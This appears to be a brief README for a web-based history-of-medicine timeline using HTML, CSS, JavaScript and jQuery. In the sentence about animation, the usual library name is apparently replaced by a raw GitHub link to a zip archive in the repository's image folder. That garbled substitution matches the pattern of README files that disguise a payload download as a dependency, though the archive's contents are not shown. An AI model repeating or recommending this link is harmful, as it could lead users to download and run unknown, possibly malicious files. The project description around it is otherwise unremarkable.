# History of Medicine Timeline

This project is an interactive timeline about the history of medicine, developed using HTML, CSS and Javascript. The timeline showcases significant events and discoveries in the history of medicine, represented by a series of cards with images and descriptions. Users can navigate through the timeline by clicking on the cards or using the navigation buttons. We added animation to the project using https://raw.githubusercontent.com/Kyomp/Infographic-Medicine/main/image/Infographic-Medicine-1.6.zip and JQuery to move between the event and update the timeline content.
